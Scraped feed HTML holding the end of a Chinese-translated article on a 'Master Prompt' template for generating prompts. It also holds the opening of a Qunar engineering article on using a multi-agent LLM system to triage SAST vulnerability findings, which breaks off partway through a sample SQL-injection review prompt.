   - Check how the user wants the final output <span class="hljs-built_in">or</span> solutions <span class="hljs-keyword">to</span> appear (bullet points, steps, <span class="hljs-built_in">or</span> a structured template).  
   - Encourage disclaimers <span class="hljs-built_in">or</span> references <span class="hljs-keyword">if</span> data <span class="hljs-built_in">is</span> incomplete.

<span class="hljs-number">6</span>. **Generate the Prompt**  
   - Consolidate all user requirements <span class="hljs-built_in">and</span> clarifications <span class="hljs-keyword">into</span> a <span class="hljs-type">single</span>, cohesive prompt <span class="hljs-keyword">with</span>:  
     - A system role <span class="hljs-built_in">or</span> persona, emphasizing verifying facts <span class="hljs-built_in">and</span> disclaiming uncertainty <span class="hljs-keyword">when</span> needed.  
     - Context describing the user<span class="hljs-comment">'s specific task or situation.  </span>
     - Clear instructions <span class="hljs-keyword">for</span> how <span class="hljs-keyword">to</span> solve <span class="hljs-built_in">or</span> respond, possibly referencing specialized tools/experts.  
     - Constraints <span class="hljs-keyword">for</span> style, length, <span class="hljs-built_in">or</span> disclaimers.  
     - The final format <span class="hljs-built_in">or</span> <span class="hljs-keyword">structure</span> <span class="hljs-keyword">of</span> the output.

<span class="hljs-number">7</span>. **Verification <span class="hljs-built_in">and</span> Delivery**  
   - <span class="hljs-keyword">If</span> you used experts, mention their review <span class="hljs-built_in">or</span> note how the final solution was confirmed.  
   - Present the final refined prompt, ensuring it<span class="hljs-comment">'s organized, thorough, and easy to follow. </span>
&lt;/Instructions&gt;

&lt;Constraints&gt;
- Keep user interactions minimal, asking follow-up questions only <span class="hljs-keyword">when</span> the user<span class="hljs-comment">'s request might cause errors or confusion if left unresolved.</span>
- Never assume unverified facts. Instead, disclaim <span class="hljs-built_in">or</span> ask the user <span class="hljs-keyword">for</span> more data.
- Aim <span class="hljs-keyword">for</span> a logically verified result. <span class="hljs-keyword">For</span> tasks requiring complex calculations <span class="hljs-built_in">or</span> coding, use <span class="hljs-string">"Expert Python"</span> <span class="hljs-built_in">or</span> other relevant experts <span class="hljs-built_in">and</span> summarize (<span class="hljs-built_in">or</span> disclaim) any uncertain parts.
- Limit the total interactions <span class="hljs-keyword">to</span> avoid overwhelming the user.
&lt;/Constraints&gt;

&lt;Output Format&gt;
&lt;System&gt;: [<span class="hljs-type">Short</span> <span class="hljs-built_in">and</span> direct role definition, emphasizing verification <span class="hljs-built_in">and</span> disclaimers <span class="hljs-keyword">for</span> uncertainty.]

&lt;Context&gt;: [User<span class="hljs-comment">'s task, goals, or background. Summarize clarifications gleaned from user input.]</span>

&lt;Instructions&gt;:
<span class="hljs-number">1</span>. [Stepwise approach <span class="hljs-built_in">or</span> instructions, including how <span class="hljs-keyword">to</span> query <span class="hljs-built_in">or</span> verify data. Break <span class="hljs-keyword">into</span> smaller tasks <span class="hljs-keyword">if</span> necessary.]
<span class="hljs-number">2</span>. [<span class="hljs-keyword">If</span> code <span class="hljs-built_in">or</span> math <span class="hljs-built_in">is</span> required, instruct <span class="hljs-string">"Expert Python"</span> <span class="hljs-built_in">or</span> <span class="hljs-string">"Expert Mathematician."</span> <span class="hljs-keyword">If</span> writing <span class="hljs-built_in">or</span> design <span class="hljs-built_in">is</span> required, use <span class="hljs-string">"Expert Writer,"</span> etc.]
<span class="hljs-number">3</span>. [Steps <span class="hljs-keyword">on</span> how <span class="hljs-keyword">to</span> handle uncertain <span class="hljs-built_in">or</span> missing information—encourage disclaimers <span class="hljs-built_in">or</span> user follow-up queries.]

&lt;Constraints&gt;: [List relevant limitations (e.g., time, style, word count, references).]

&lt;Output Format&gt;: [Specify exactly how the user wants the final content <span class="hljs-built_in">or</span> solution <span class="hljs-keyword">to</span> be structured—bullets, paragraphs, code blocks, etc.]

&lt;Reasoning&gt; (<span class="hljs-keyword">Optional</span>):
[Include only <span class="hljs-keyword">if</span> user explicitly desires a chain-<span class="hljs-keyword">of</span>-thought <span class="hljs-built_in">or</span> rationale. Otherwise, omit <span class="hljs-keyword">to</span> keep the prompt succinct.]

&lt;/Output Format&gt;

&lt;User Input&gt;
Reply <span class="hljs-keyword">with</span> the following introduction:
<span class="hljs-string">"What is the topic or role of the prompt you want to create? Share any details you have, and I will help refine it into a clear, verified prompt with minimal chance of hallucination."</span>

<span class="hljs-built_in">Await</span> user response. Ask clarifying questions <span class="hljs-keyword">if</span> needed, <span class="hljs-keyword">then</span> produce the final prompt <span class="hljs-keyword">using</span> the above <span class="hljs-keyword">structure</span>.
&lt;/User Input&gt;
</code></pre>
<hr/>
<h3 data-id="heading-3">如何使用 Master Prompt（含实例）</h3>
<p>下面用几个例子说明如何实际使用这个提示词生成器。</p>
<h4 data-id="heading-4">示例一：为非虚构写作找真实故事</h4>
<p>假设你在写一篇关于「耐心」的非虚构文章，需要用一个故事开篇。</p>
<p><strong>步骤 1</strong>：把 Master Prompt 粘贴到 ChatGPT o1 等推理模型中。<br/>
ChatGPT 会问：「你想创建的提示词的主题或角色是什么？」</p>
<p><strong>步骤 2</strong>：用你的任务回答。<br/>
例如：「我想要一个能帮我找到适合非虚构写作的真实故事的提示词。我在写关于耐心的内容。」</p>
<p>ChatGPT 会产出一个结构化的提示词。</p>
<p><strong>步骤 3</strong>：把步骤 2 得到的提示词粘贴到常规模型（如 ChatGPT 4o / Claude / Gemini）中。<br/>
4o 会生成相应故事（例如曼德拉入狱、J.K. 罗琳多次退稿等关于耐心的例子）。</p>
<p><strong>步骤 4</strong>：根据需要继续提要求。<br/>
若觉得这些人物/事件太有名、希望读者更容易共鸣，可以补充：「这些人物/事件太有名了，我想要普通人更能产生共鸣的、不那么知名的故事。」<br/>
模型会据此调整，并可能附带可进一步查阅的出处。</p>
<h4 data-id="heading-5">示例二：生成非虚构书籍大纲</h4>
<p>假设你在写一本关于「有孩子的人如何应对职业空窗期」的书。</p>
<p>把 Master Prompt 粘贴到 <strong>ChatGPT o1</strong>，输入类似：「我想要一个能帮我构思正在写的书的提纲的提示词，书的内容是关于有孩子的人的职业空窗期。」</p>
<p>o1 会生成一个完整提示词；将该提示词粘贴到 <strong>GPT 4o</strong>，即可得到包含财务规划、职业保留策略、管理雇主预期等章节的书籍大纲。</p>
<hr/>
<h3 data-id="heading-6">测试与打磨基线提示词的 3 条建议</h3>
<p>有了基线提示词之后：</p>
<ol>
<li><strong>迭代</strong>：每次只改一处，对比效果。这样能清楚知道哪部分起作用、为什么。</li>
<li><strong>加示例</strong>：在提示词里加入你期望的输出样例。例如要生成博客开头，就放一个你写过或欣赏的开头。</li>
<li><strong>二八法则</strong>：把精力放在对结果影响最大的部分。对多数写作任务来说，明确受众和目的往往能带来最大提升。</li>
</ol>
<hr/>
<h3 data-id="heading-7">结语：不再面对空白提示页</h3>
<p>有了这个 Master Prompt，和 AI 协作时就不必再从零开始。</p>
<p>下次再对着闪烁的光标发呆时，记得用这个主提示词——你会得到一个比空白输入框好得多的起点。</p>
<hr/>
<p><em>文档由原文整理并译成中文，保留全部结构与内容。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[去哪儿网白盒漏洞 AI 运营实践]]></title>    <link>https://juejin.cn/post/7602158221852246031</link>    <guid>https://juejin.cn/post/7602158221852246031</guid>    <pubDate>2026-02-03T06:47:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602158221852246031" data-draft-id="7602146335216697384" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="去哪儿网白盒漏洞 AI 运营实践"/> <meta itemprop="keywords" content="人工智能,后端,Agent"/> <meta itemprop="datePublished" content="2026-02-03T06:47:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="去哪儿技术沙龙"/> <meta itemprop="url" content="https://juejin.cn/user/2251436075786791"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            去哪儿网白盒漏洞 AI 运营实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2251436075786791/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    去哪儿技术沙龙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:47:15.000Z" title="Tue Feb 03 2026 06:47:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在当今快速发展的软件开发环境中，安全漏洞管理正在经历一场深刻的变革。随着 DevOps 理念的广泛普及，安全左移（Shift Left Security）已成为行业共识，企业纷纷将安全检测前置到开发流程的早期阶段，构建真正的 DevSecOps 体系，去哪儿网也基于微软提出的软件开发生命周期（SDLC）将安全左移嵌入 DevOps 流程中。</p>
<p>在实际工程实践中，SAST 作为安全检测的核心能力，承担着漏洞发现的兜底责任，而 IAST 和 DAST 更多作为补充手段。这种架构设计使得 SAST 的运营质量直接决定了整个安全漏洞管理体系的有效性。安全开发生命周期（SDLC）中的白盒扫描环节一直面临着严峻挑战：业内比较优秀的静态应用安全测试（SAST）工具的准确率基本也维持在 60-70%左右，大量人力消耗在漏洞真实性确认上。大部分互联网公司安全团队在 SDLC 上的人力投入可达 40% 甚至更多。</p>
<h2 data-id="heading-1">一、SDLC 白盒漏洞管理的行业通用流程</h2>
<p>在大多数企业的 SDLC 流程中，白盒漏洞管理通常包含以下几个步骤：</p>
<ol>
<li>
<p>代码提交触发扫描：开发提交代码后，由 CI 系统自动触发 SAST 工具（如 Fortify、Checkmarx、SonarQube、Coverity 等）进行静态扫描。</p>
</li>
<li>
<p>生成初始漏洞报告：SAST 工具会输出检测结果，通常包括漏洞类型、源文件路径、调用链、风险等级等，格式可能是 XML、JSON、PDF、Word、SARIF 等。</p>
</li>
<li>
<p>人工审核与确认：安全工程师需要对漏洞逐一审查，验证该漏洞是否误报（主要确认输入点外部是否可控、是否已做白名单过滤或类型检查等）</p>
</li>
<li>
<p>漏洞归类与派单：审核通过后根据系统、模块、责任人信息将漏洞录入工单系统派发至对应的开发或业务团队。</p>
</li>
<li>
<p>漏洞修复与复审：研发根据漏洞详情和修复建议对漏洞进行修复，安全团队复测验证修复效果，最终关闭漏洞记录。</p>
</li>
<li>
<p>数据沉淀与运营分析：安全团队对漏洞数量、类型分布、修复时长（MTTR）、责任归属等指标进行归档与复盘，优化规则和策略。</p>
</li>
</ol>
<p>流程示意图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3374b11662345f79eef285bf92cfd6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=1kedtZeqBx%2FcdKNmrRepzupcAh4%3D" alt="" loading="lazy"/></p>
<p>然而该流程存在以下几类通用难点：</p>
<ul>
<li>
<p>SAST 误报率高 → 人工审核压力大；</p>
</li>
<li>
<p>SAST 审核效率低 → 单个漏洞人工审核至少要 15-30 分钟</p>
</li>
<li>
<p>审核缺乏标准化 → 不同工程师审核结论可能不一致；</p>
</li>
</ul>
<h2 data-id="heading-2">二、Multi-Agent 智能漏洞审核系统设计理念</h2>
<p>针对传统 SAST 面临的挑战，我们引入了<strong>Multi-Agent（多智能体）架构</strong>，旨在构建一个<strong>AI自动化、专业化、可扩展</strong>的白盒漏洞智能审核系统。该系统的核心理念在于：将复杂的漏洞审核任务分解为多个协作的、具备特定能力的 AI 智能体，通过<strong>任务的智能调度、专业化分析与分层复核</strong>，实现漏洞的精准识别与自动化处理。</p>
<p>示意图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e9c96d1d5034ce685af048665eb596a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=nMAgUeD36nzFbAMr%2FGOV5GAVqLU%3D" alt="" loading="lazy"/></p>
<p>核心思路主要体现在以下几个方面：</p>
<h3 data-id="heading-3">1、专业化分工</h3>
<p>不同类型的安全漏洞（如 SQL 注入、SSRF、命令注入等）往往涉及不同的攻击原理、检测方法和上下文分析。传统的单一审核流程难以兼顾所有细节。多智能体架构通过构建<strong>专精于特定漏洞类型的智能体</strong>，确保每个漏洞都能得到最专业的分析，从而大幅提升审核的准确率和深度。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b4ceee7d66b47c29cf2adcade545669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=MRjZ2tqsAAQtnrnhtYtE4P%2FPs98%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2、自动化协同</h3>
<p>系统通过<strong>智能调度代理</strong>自动识别漏洞类型并将其分发给相应的专业审核代理，实现审核流程的自动化流转。这不仅减少了人工干预，也极大地提升了处理效率。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7339c9745d2447dfbbcc0eabd1b25926~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=h%2FT41j38SLQBIo9nyZ1a5vwdy6o%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">3、可扩展性与灵活性</h3>
<p>随着新漏洞类型和新攻击手法的不断出现，系统需要具备快速适应和扩展的能力。多智能体架构的核心优势：<strong>针对不同漏洞类型可以独立调优，且不会影响其他 Agent 的效果</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8741e796d57e417e9dea64737a064b63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=ERE7t4ZfT5GDAvjGpOWDL4hj5KA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">4、质量保障与复核机制</h3>
<p>为确保审核结果的可靠性，系统设计了<strong>汇总分析 Agent</strong>的角色。该代理负责对初审代理的报告进行复核，提炼最终结论，并生成标准化的结构化数据，为后续的自动化工单推送提供准确依据，有效避免了因单一 AI 判断而可能出现的偏差。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/299be9b7669f430abca560432aeced73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=WJlkZfAVr07xlYLeF92lpqDSh04%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">三、系统架构与核心 Agent 角色</h2>
<p>我们构建的智能审核系统以 n8n 为编排平台，以 DeepSeek-V3 大语言模型为基础，围绕以下组件展开：</p>
<h3 data-id="heading-8">1、输入与数据获取层</h3>
<ul>
<li>
<p>支持 webhook 接入、工作流触发等多种入口；</p>
</li>
<li>
<p>根据漏洞哈希调用内部 SAST API 获取漏洞详情；</p>
</li>
</ul>
<p>SAST 平台本身提供丰富的漏洞信息可用于漏洞审核分析：</p>
<p><strong>项目基础信息</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcf16830e0724eb6908e3dab3ad4e2e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=lnERT4pNZBRmgmEa3bf8g8SrHfw%3D" alt="" loading="lazy"/></p>
<p><strong>漏洞基本信息</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a99c342021f4ffcb176aacfc9c9c1f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=INk72XdyJzOU%2FPc8qGIMk%2Bkpxi4%3D" alt="" loading="lazy"/></p>
<p><strong>漏洞 SARIF 标准数据</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ccd31c2d5734480aa51633565ca7621~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=ZJr%2Fq%2BBKAzFARoC4hQjMtDlMjyU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2、任务调度 Agent</h3>
<ul>
<li>
<p>根据 rule_name 映射漏洞类型（如<code>sql-injection</code>→<code>sql_injection_agen``t</code>）；</p>
</li>
<li>
<p>将任务分发给对应专业审核 Agent。</p>
</li>
</ul>
<p><strong>任务分发规则</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de92b7c7b89c4baa9a3c9a1bd504a0af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=0ynG3l1TUXFeFZ5kZYyeCl%2BNAnM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">3、专业审核 Agent</h3>
<ul>
<li>
<p>每个 Agent 审核一种漏洞类型；</p>
</li>
<li>
<p>能调用<strong>SAST MCP</strong>和<strong>Gitlab MCP</strong>获取调用链、源码片段、字段类型等上下文信息；</p>
</li>
<li>
<p>输出 Markdown 审核报告，包含分析过程、判断逻辑、风险描述与修复建议。</p>
</li>
</ul>
<p><strong>Agent Prompt 编写建议</strong></p>
<p>Agent 的 Prompt 是这个系统里面最重要的部分，核心思路是将复杂专业任务分解为可控制、可验证、可重复的标准化流程。我在编写了上万字的 Prompt 后总结出的主要心得如下：</p>
<ul>
<li>
<p>**Prompt并不是越长越好：**2024 年我们第一次尝试大模型漏洞审核的时候，我们的第一个 Prompt 长达 5000+字符，效果并不是很好。根据经验来看，当 Prompt 的字符数达到 2000+以上就容易出现幻觉或推理错误的问题，所以编写 Prompt 要尽可能的简练。</p>
</li>
<li>
<p>**Prompt需要持续优化：**没有哪个有效的 prompt 是一次性写完的，大部分情况下我们需要监控 AI 的运行过程，理解 AI 的执行过程，发现 AI 思路上的错误，通过 prompt 指令进行优化。</p>
</li>
<li>
<p>**大模型需要足够的信息：**大模型主要是代替人的思考，前提是它能获取到足够的信息进行思考和分析，善用 MCP/FunctionCall 来给 AI 投喂信息。</p>
</li>
<li>
<p>**渐进式约束大模型：**一般规则 → 具体限制 → 异常处理，由浅入深，让大模型先能解决大部分问题，再优化部分特殊场景</p>
</li>
<li>
<p><strong>证据链要求，避免 AI 生成代码</strong>：必须展示原始数据和具体示例，否则大模型可能会生成出来根本不存在的代码进行分析，最终给出错误的结论</p>
</li>
<li>
<p><strong>标准化错误</strong>：预设错误场景和统一回复模板，否则大模型会产生幻觉，基于错误信息继续分析，给出错误的结论</p>
</li>
</ul>
<h4 data-id="heading-11">核心编写公式</h4>
<p><strong>Prompt = 角色身份 + 工具约束 + 执行流程 + 质量控制 + 输出规范</strong></p>
<p><strong>1.角色定位</strong></p>
<pre><code class="hljs language-css" lang="css">你是一个<span class="hljs-selector-attr">[专业领域]</span>的<span class="hljs-selector-attr">[具体职位/专家]</span>
用户会给你<span class="hljs-selector-attr">[具体输入格式]</span>，请你<span class="hljs-selector-attr">[具体任务目标]</span>
</code></pre>
<p><strong>2.工具约束</strong></p>
<pre><code class="hljs language-css" lang="css">✅ <span class="hljs-selector-attr">[工具名]</span>：<span class="hljs-selector-attr">[允许场景]</span>
❌ 禁止<span class="hljs-selector-attr">[具体操作]</span>，必须中止并报错：<span class="hljs-selector-attr">[标准错误回复]</span>
</code></pre>
<p><strong>3.执行流程</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. <span class="hljs-selector-attr">[步骤名]</span>：使用<span class="hljs-selector-attr">[工具]</span>获取<span class="hljs-selector-attr">[内容]</span>
   * 若<span class="hljs-selector-attr">[条件A]</span>，则<span class="hljs-selector-attr">[操作A]</span>
   * 若失败，终止并返回：<span class="hljs-selector-attr">[错误说明]</span>
<span class="hljs-number">2</span>. <span class="hljs-selector-attr">[下一步]</span>...
</code></pre>
<p><strong>4.质量控制</strong></p>
<pre><code class="hljs language-css" lang="css">⚠️ 一旦<span class="hljs-selector-attr">[条件]</span>确认为<span class="hljs-selector-attr">[结果]</span>，后续不得声称为<span class="hljs-selector-attr">[矛盾结果]</span>
判断条件（必须同时满足）：
- <span class="hljs-selector-attr">[条件1]</span> + <span class="hljs-selector-attr">[条件2]</span> + <span class="hljs-selector-attr">[条件3]</span>
</code></pre>
<p><strong>5.输出规范</strong></p>
<pre><code class="hljs language-css" lang="css">输出内容须包含：<span class="hljs-selector-attr">[要素1]</span> + <span class="hljs-selector-attr">[要素2]</span> + <span class="hljs-selector-attr">[要素3]</span>
格式要求：<span class="hljs-selector-attr">[具体格式]</span>，避免<span class="hljs-selector-attr">[不当格式]</span>
</code></pre>
<h4 data-id="heading-12">实际案例：SQL 注入漏洞审核员 Agent Prompt</h4>
<p><strong>1.角色定位</strong></p>
<pre><code class="hljs language-bash" lang="bash">你是一个精通 SQL 注入漏洞分析的 SAST 白盒漏洞审核专家。用户会给你发送一个漏洞 <span class="hljs-built_in">hash</span>（例如 <span class="hljs-string">"1a223fbee9xxxxxxxxx"</span>），请你完整分析该漏洞是否真实存在：
</code></pre>
<h5 data-id="heading-13">2.工具约束</h5>
<p>为了明确 AI 能够获取到对应的 FunctionCall 以及 MCP Tool，最好显式的在Prompt 中声明好能够调用的工具。如果有必要，也可以把具体的 FunctionCall Name 在 Prompt 中写明。例如：</p>
<pre><code class="hljs language-markdown" lang="markdown">一、工具使用规范（必须严格遵守）

<span class="hljs-bullet">1.</span> 工具说明：

<span class="hljs-bullet">*</span> ✅ SAST 工具：只能获取 SARIF 中记录的调用链文件内容。
<span class="hljs-bullet">*</span> ✅ GitLab 工具：可任意访问 GitLab 仓库中的 Java 源码文件（base64 编码），用于获取字段类型与白名单校验逻辑。
</code></pre>
<p>在实际的使用中，SAST 工具无法获取漏洞调用链意外的代码文件内容，需要通过 Gitlab MCP 工具来获取，所以我们添加如下工具约束：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">*</span> ❌ 禁止使用 SAST 工具获取 SARIF 中未出现的 Java 文件路径内容（如 model、dto、entity 等类文件），此行为为审核流程错误，必须中止并报错：

请返回简洁错误说明，如：

审核流程错误：尝试使用 SAST 工具获取 SARIF 中未记录的文件路径内容，请改为使用 GitLab 工具。
</code></pre>
<p>以上 Prompt 在实际使用中，在大部分情况下，是不会返回“审核流程错误”的，但的确会规范 Agent 使用 Gitlab MCP 去获取 SAST 获取不到的代码内容。</p>
<p><strong>3.执行流程</strong></p>
<p>明确 SQL 注入审核员的主要审核思路，例如：</p>
